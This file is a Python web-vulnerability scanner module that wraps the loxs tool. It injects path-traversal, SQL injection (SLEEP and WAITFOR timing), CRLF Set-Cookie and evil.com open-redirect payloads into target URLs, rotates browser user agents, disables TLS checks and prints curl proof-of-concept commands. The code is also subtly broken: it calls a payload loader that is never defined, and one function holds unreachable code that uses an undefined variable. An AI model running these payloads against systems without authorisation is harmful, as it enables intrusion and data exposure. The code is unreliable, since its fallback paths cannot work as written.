"""
engine/loxs_wrapper.py — Direct Python scanning without loxs.py's broken dependencies.

loxs.py crashes at import due to `from git import Repo` (not installed).
Instead of shelling into loxs.py, we re-implement its core scan logic directly:
  - LFI:  URL + payload → check response for /etc/passwd / root: / win.ini patterns
  - SQLi: URL + payload → timing >= 10s = vulnerable (same as loxs run_sql_scanner)
  - XSS:  URL + payload → placeholder (needs headless browser; skipped without selenium)
  - CRLF: URL + payload → check response headers for injected Set-Cookie
  - OR:   URL + payload → check redirect Location header

All functions follow the standard output contract:
{
  "status":   "ok" | "error" | "skipped",
  "tool":     "loxs_wrapper",
  "findings": [{bug, url, payload, evidence, severity, confidence}],
  "errors":   [],
  "meta":     {scan_type, urls_tested, payloads_tested}
}
"""

import os, re, time, logging, random, urllib.parse
from pathlib import Path
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

import urllib.request, urllib.error, ssl

log = logging.getLogger("elite.loxs_wrapper")

LOXS_DIR    = Path(__file__).parent.parent / "external_tools" / "loxs-main"
PAYLOAD_DIR = LOXS_DIR / "payloads"
CUSTOM_PAYLOADS = Path(__file__).parent.parent / "external_tools" / "payloads-main"

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0.5735.198 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
]

# LFI: patterns indicating successful file read
_LFI_PATTERNS = [
    r"root:\s*[x*]?:\d+:\d+:",          # /etc/passwd
    r"\[boot loader\]",                   # win.ini
    r"\[extensions\]",                    # win.ini
    r"for 16-bit app support",            # win.ini
    r"root:.*?/bin/",                     # /etc/passwd variant
    r"nobody:.*?:/",                      # /etc/passwd
    r"daemon:.*?:/",
    r"etc/shadow",
    r"www-data:.*?:/",
]
_LFI_RE = [re.compile(p, re.I) for p in _LFI_PATTERNS]

# CRLF: injected header marker (same as loxs)
_CRLF_MARKER = "loxs=injected"

# Default CRLF payloads (from loxs filter.sh logic)
_CRLF_PAYLOADS = [
    "/%0a%0dSet-Cookie:loxs=injected",
    "/%0d%0aSet-Cookie:loxs=injected",
    "/%0aSet-Cookie:loxs=injected",
    "/%0d%0a%0d%0aSet-Cookie:loxs=injected",
    "/%0d%0aContent-Length:0%0d%0a%0d%0aSet-Cookie:loxs=injected",
    "/%2F%2E%2E%0d%0aSet-Cookie:loxs=injected",
    "/%u000aSet-Cookie:loxs=injected",
]

# OR (open redirect) — from loxs + GFpattren redirect patterns
_OR_PAYLOADS = [
    "https://evil.com", "//evil.com", "//evil.com/%2F..",
    "https://evil.com%23", "https://evil.com%3F",
    "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
]


def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _get(url: str, timeout: int = 10,
         cookie: str = "", allow_redirects: bool = True):
    """Simple HTTP GET; returns (status, headers_dict, body, elapsed_s)."""
    t0 = time.monotonic()
    try:
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": random.choice(_USER_AGENTS),
                "Accept":     "*/*",
                "Cookie":     cookie or "",
            }
        )
        with urllib.request.urlopen(
            req, timeout=timeout, context=_ssl_ctx()
        ) as resp:
            body    = resp.read(65536).decode("utf-8", errors="replace")
            headers = dict(resp.headers)
            status  = resp.status
    except urllib.error.HTTPError as e:
        body    = e.read(4096).decode("utf-8", errors="replace")
        headers = dict(e.headers)
        status  = e.code
    except Exception as e:
        return None, {}, "", time.monotonic() - t0
    return status, headers, body, time.monotonic() - t0


def _inject_payload(url: str, payload: str) -> str:
    """Append payload to every parameter value in the URL."""
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return url + payload
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    new_qs = {k: [v[0] + payload] for k, v in qs.items()}
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True))
    )


def _get_payloads_for(scan_type: str, param: str = "", limit: int = 50) -> List[str]:
    """
    Get payloads from payload_manager with smart selection.
    Falls back to local file loading if payload_manager unavailable.
    """
    try:
        from engine.payload_manager import get_smart_payloads
        return get_smart_payloads(scan_type, param_name=param, limit=limit)
    except Exception as e:
        log.debug(f"[loxs_wrapper] payload_manager unavailable: {e}, using local files")
        return []
    try:
        lines = Path(path).read_text(errors="replace").splitlines()
        return [l.strip() for l in lines if l.strip()][:limit]
    except Exception:
        return []


def _std_result(scan_type: str, findings: List[Dict],
                errors: List[str], urls_tested: int,
                payloads_tested: int) -> Dict:
    return {
        "status":   "ok" if not errors or findings else ("error" if not findings and errors else "ok"),
        "tool":     "loxs_wrapper",
        "findings": findings,
        "errors":   errors[:10],
        "meta": {
            "scan_type":       scan_type,
            "urls_tested":     urls_tested,
            "payloads_tested": payloads_tested,
        }
    }


# ── LFI Scanner ───────────────────────────────────────────────────────────────

def scan_lfi(urls: List[str],
             payload_file: str = "",
             cookie: str = "",
             threads: int = 5,
             timeout: int = 8) -> Dict:
    """
    LFI scanner: injects path traversal payloads and checks response for
    /etc/passwd, win.ini, and similar patterns.
    Same detection logic as loxs run_lfi_scanner.
    """
    if not payload_file:
        payload_file = str(PAYLOAD_DIR / "lfi.txt")
        if not Path(payload_file).exists():
            payload_file = str(CUSTOM_PAYLOADS / "directory_traversal_unix.txt")

    # Try smart payload selection first; fall back to file
    payloads = _get_payloads_for("lfi", limit=60) or _load_payloads(payload_file, limit=50)
    if not payloads:
        return _std_result("lfi", [], ["payload file not found"], len(urls), 0)

    log.info(f"[loxs_wrapper] LFI: {len(urls)} URLs × {len(payloads)} payloads")
    findings: List[Dict] = []
    errors:   List[str]  = []
    seen:     set         = set()

    def _test(url: str, payload: str) -> Optional[Dict]:
        target = _inject_payload(url, payload)
        status, _, body, elapsed = _get(target, timeout=timeout, cookie=cookie)
        if status is None:
            return None
        for rx in _LFI_RE:
            m = rx.search(body)
            if m:
                evidence = body[max(0, m.start()-30):m.end()+60].strip()
                return {
                    "bug":        "lfi",
                    "url":        url,
                    "payload":    payload,
                    "evidence":   evidence[:200],
                    "tool":       "loxs_wrapper",
                    "severity":   "high",
                    "confidence": 90,
                    "poc":        f"curl -sk '{target}'",
                }
        return None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        fts = {ex.submit(_test, url, pl): (url, pl)
               for url in urls for pl in payloads[:20]}
        for ft in as_completed(fts):
            try:
                r = ft.result()
                if r:
                    k = f"{r['url']}:{r['payload'][:30]}"
                    if k not in seen:
                        seen.add(k)
                        findings.append(r)
                        log.info(f"[loxs_wrapper] LFI FOUND: {r['url'][:60]}")
            except Exception as e:
                errors.append(str(e))

    log.info(f"[loxs_wrapper] LFI: results_found={len(findings)}")
    return _std_result("lfi", findings, errors, len(urls), len(payloads))


# ── SQLi Timing Scanner ───────────────────────────────────────────────────────

def scan_sqli(urls: List[str],
              payload_file: str = "",
              cookie: str = "",
              threads: int = 3,
              timeout: int = 15,
              timing_threshold: float = 8.0) -> Dict:
    """
    Error-based + timing SQLi scanner.
    Same timing logic as loxs run_sql_scanner: response_time >= 10s = vulnerable.
    We use 8s threshold for safety.
    """
    # Try smart payload selection first
    payloads = _get_payloads_for("sqli", limit=40)
    if not payloads:
        if not payload_file:
            for candidate in [
                str(PAYLOAD_DIR / "sqli" / "mysql.txt"),
                str(CUSTOM_PAYLOADS / "allsqli.txt"),
            ]:
                if Path(candidate).exists():
                    payload_file = candidate
                    break
        if payload_file:
            payloads = _load_payloads(payload_file, limit=30)
        else:
            payloads = [
                "'", "''", "' OR '1'='1", "' OR 1=1--",
                "1' AND SLEEP(8)--", "1' AND SLEEP(8) AND '1'='1",
                "1' WAITFOR DELAY '0:0:8'--",
                "' OR SLEEP(8)--", "1; WAITFOR DELAY '0:0:8'--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(8)))a)--",
            ]

    # SQL error patterns (error-based detection)
    _SQL_ERRORS = re.compile(
        r"(you have an error in your sql syntax|"
        r"unclosed quotation mark|ORA-\d{5}|"
        r"pg_query\(\)|Microsoft OLE DB|"
        r"Warning.*?mysql_.*?\(|Supplied argument is not|"
        r"Column count doesn|mysql_fetch_array|"
        r"SQLSTATE\[|syntax error or access violation)",
        re.I
    )

    log.info(f"[loxs_wrapper] SQLi: {len(urls)} URLs × {len(payloads)} payloads")
    findings: List[Dict] = []
    errors:   List[str]  = []
    seen:     set         = set()

    def _test(url: str, payload: str) -> Optional[Dict]:
        target = _inject_payload(url, payload)
        status, headers, body, elapsed = _get(
            target, timeout=timeout, cookie=cookie
        )
        if status is None:
            return None

        # Timing-based detection (same as loxs: >= 10s, we use 8s)
        if elapsed >= timing_threshold:
            return {
                "bug":        "sqli",
                "url":        url,
                "payload":    payload,
                "evidence":   f"response_time={elapsed:.1f}s >= {timing_threshold}s",
                "tool":       "loxs_wrapper",
                "severity":   "critical",
                "confidence": 85,
                "poc":        f"curl -sk '{target}'",
            }

        # Error-based detection
        m = _SQL_ERRORS.search(body)
        if m:
            return {
                "bug":        "sqli",
                "url":        url,
                "payload":    payload,
                "evidence":   body[max(0,m.start()-20):m.end()+80].strip()[:200],
                "tool":       "loxs_wrapper",
                "severity":   "critical",
                "confidence": 80,
                "poc":        f"curl -sk '{target}'",
            }
        return None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        fts = {ex.submit(_test, url, pl): (url, pl)
               for url in urls for pl in payloads}
        for ft in as_completed(fts):
            try:
                r = ft.result()
                if r:
                    k = f"{r['url']}:{r['payload'][:20]}"
                    if k not in seen:
                        seen.add(k)
                        findings.append(r)
                        log.info(f"[loxs_wrapper] SQLi FOUND: {r['url'][:60]} elapsed={r['evidence'][:30]}")
            except Exception as e:
                errors.append(str(e))

    log.info(f"[loxs_wrapper] SQLi: results_found={len(findings)}")
    return _std_result("sqli", findings, errors, len(urls), len(payloads))


# ── CRLF Injection Scanner ────────────────────────────────────────────────────

def scan_crlf(urls: List[str],
              cookie: str = "",
              threads: int = 5,
              timeout: int = 8) -> Dict:
    """
    CRLF injection scanner. Checks for Set-Cookie header injection.
    Payloads and detection from loxs run_crlf_scanner.
    """
    log.info(f"[loxs_wrapper] CRLF: {len(urls)} URLs × {len(_CRLF_PAYLOADS)} payloads")
    findings: List[Dict] = []
    errors:   List[str]  = []
    seen:     set         = set()

    def _test(url: str, payload: str) -> Optional[Dict]:
        # Append payload to path (not query string — CRLF is path-based)
        base = url.split("?")[0].rstrip("/")
        target = base + payload
        status, headers, body, elapsed = _get(
            target, timeout=timeout, cookie=cookie
        )
        if status is None:
            return None

        # Check response headers for injected Set-Cookie
        set_cookie = headers.get("Set-Cookie","") + headers.get("set-cookie","")
        if _CRLF_MARKER in set_cookie:
            return {
                "bug":        "crlf",
                "url":        url,
                "payload":    payload,
                "evidence":   f"Set-Cookie header contains '{_CRLF_MARKER}'",
                "tool":       "loxs_wrapper",
                "severity":   "medium",
                "confidence": 90,
                "poc":        f"curl -sk -v '{target}' 2>&1 | grep -i 'set-cookie'",
            }
        # Check body for injected marker (some servers reflect headers)
        if _CRLF_MARKER in body:
            return {
                "bug":        "crlf",
                "url":        url,
                "payload":    payload,
                "evidence":   f"Response body contains CRLF marker",
                "tool":       "loxs_wrapper",
                "severity":   "medium",
                "confidence": 75,
                "poc":        f"curl -sk '{target}'",
            }
        return None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        fts = {ex.submit(_test, url, pl): (url, pl)
               for url in urls for pl in _CRLF_PAYLOADS}
        for ft in as_completed(fts):
            try:
                r = ft.result()
                if r:
                    k = f"{r['url']}:{r['payload'][:20]}"
                    if k not in seen:
                        seen.add(k)
                        findings.append(r)
                        log.info(f"[loxs_wrapper] CRLF FOUND: {r['url'][:60]}")
            except Exception as e:
                errors.append(str(e))

    log.info(f"[loxs_wrapper] CRLF: results_found={len(findings)}")
    return _std_result("crlf", findings, errors, len(urls), len(_CRLF_PAYLOADS))


# ── Open Redirect Scanner ─────────────────────────────────────────────────────

def scan_or(urls: List[str],
            cookie: str = "",
            threads: int = 5,
            timeout: int = 8) -> Dict:
    """
    Open redirect scanner. Checks if redirect params point to evil.com.
    """
    log.info(f"[loxs_wrapper] OR: {len(urls)} URLs × {len(_OR_PAYLOADS)} payloads")
    findings: List[Dict] = []
    errors:   List[str]  = []
    seen:     set         = set()

    _TARGET_DOMAIN = "evil.com"

    def _test(url: str, payload: str) -> Optional[Dict]:
        target = _inject_payload(url, payload)
        status, headers, body, elapsed = _get(
            target, timeout=timeout, cookie=cookie
        )
        if status is None:
            return None

        location = headers.get("Location","") + headers.get("location","")
        if _TARGET_DOMAIN in location and status in (301,302,303,307,308):
            return {
                "bug":        "redirect",
                "url":        url,
                "payload":    payload,
                "evidence":   f"Location: {location[:100]} (HTTP {status})",
                "tool":       "loxs_wrapper",
                "severity":   "medium",
                "confidence": 90,
                "poc":        f"curl -sk -v '{target}' 2>&1 | grep -i 'location'",
            }
        return None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        fts = {ex.submit(_test, url, pl): (url, pl)
               for url in urls for pl in _OR_PAYLOADS}
        for ft in as_completed(fts):
            try:
                r = ft.result()
                if r:
                    k = f"{r['url']}:{r['payload'][:20]}"
                    if k not in seen:
                        seen.add(k)
                        findings.append(r)
                        log.info(f"[loxs_wrapper] OR FOUND: {r['url'][:60]}")
            except Exception as e:
                errors.append(str(e))

    log.info(f"[loxs_wrapper] OR: results_found={len(findings)}")
    return _std_result("or", findings, errors, len(urls), len(_OR_PAYLOADS))


# ── Blind SQLi (customBsqli replacement) ─────────────────────────────────────

def scan_bsqli(urls: List[str],
               payload_file: str = "",
               cookie: str = "",
               threads: int = 3,
               timeout: int = 15,
               timing_threshold: float = 4.5) -> Dict:
    """
    Blind SQLi (timing-based). Re-implements customBsqli-main/lostsec.py BSQLI
    class without interactive stdin.

    lostsec.py BSQLI.perform_request() logic:
      - GET url+payload
      - if response_time >= 4.5s → vulnerable
    """
    # Smart selection first; then file; then inline
    payloads = _get_payloads_for("sqli_time", limit=30)
    if not payloads:
        if not payload_file:
            for candidate in [
                str(CUSTOM_PAYLOADS / "blindsqli.txt"),
                str(PAYLOAD_DIR / "sqli" / "mysql.txt"),
            ]:
                if Path(candidate).exists():
                    payload_file = candidate
                    break
        if payload_file:
            payloads = _load_payloads(payload_file, limit=50)
    if not payloads:
        payloads = [
            "' AND SLEEP(5)--", "1 AND SLEEP(5)--",
            "' OR SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
        ]

    log.info(f"[bsqli] Blind SQLi: {len(urls)} URLs × {len(payloads)} payloads"
             f" threshold={timing_threshold}s")
    findings: List[Dict] = []
    errors:   List[str]  = []
    seen:     set         = set()

    def _test(url: str, payload: str) -> Optional[Dict]:
        # Baseline request first (same as BSQLI class logic)
        _, _, _, baseline = _get(url, timeout=5, cookie=cookie)

        target = url + payload
        _, _, _, elapsed = _get(target, timeout=timeout, cookie=cookie)

        # Confirmed only if: elapsed >= threshold AND baseline < 2s
        if elapsed >= timing_threshold and baseline < 2.0:
            return {
                "bug":        "sqli",
                "url":        url,
                "payload":    payload,
                "evidence":   f"timing delta={elapsed:.1f}s baseline={baseline:.1f}s",
                "tool":       "customBsqli_wrapper",
                "severity":   "critical",
                "confidence": 88,
                "poc":        f"curl -sk '{target}'",
            }
        return None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        fts = {ex.submit(_test, url, pl): (url, pl)
               for url in urls for pl in payloads}
        for ft in as_completed(fts):
            try:
                r = ft.result()
                if r:
                    k = f"{r['url']}:{r['payload'][:20]}"
                    if k not in seen:
                        seen.add(k)
                        findings.append(r)
                        log.info(f"[bsqli] BLIND SQLi FOUND: {r['url'][:60]}")
            except Exception as e:
                errors.append(str(e))

    log.info(f"[bsqli] results_found: {len(findings)}")
    return _std_result("bsqli", findings, errors, len(urls), len(payloads))


# ── Unified dispatcher ────────────────────────────────────────────────────────

def scan(scan_type: str, urls: List[str],
         payload_file: str = "",
         cookie: str = "",
         threads: int = 5,
         timeout: int = 10) -> Dict:
    """
    Dispatch to the correct scanner by type.
    scan_type: 'lfi' | 'sqli' | 'crlf' | 'or' | 'bsqli'
    Always returns standard contract dict.
    """
    if not urls:
        return {"status":"skipped","tool":"loxs_wrapper","findings":[],
                "errors":[],"meta":{"scan_type":scan_type,"reason":"no_urls"}}

    _dispatch = {
        "lfi":   scan_lfi,
        "sqli":  scan_sqli,
        "crlf":  scan_crlf,
        "or":    scan_or,
        "redirect": scan_or,
        "bsqli": scan_bsqli,
    }
    fn = _dispatch.get(scan_type)
    if not fn:
        return {"status":"error","tool":"loxs_wrapper","findings":[],
                "errors":[f"unknown scan_type: {scan_type}"],
                "meta":{"scan_type":scan_type}}

    kw = {"cookie": cookie, "threads": threads, "timeout": timeout}
    if scan_type not in ("crlf", "or", "redirect"):
        kw["payload_file"] = payload_file

    return fn(urls, **kw)
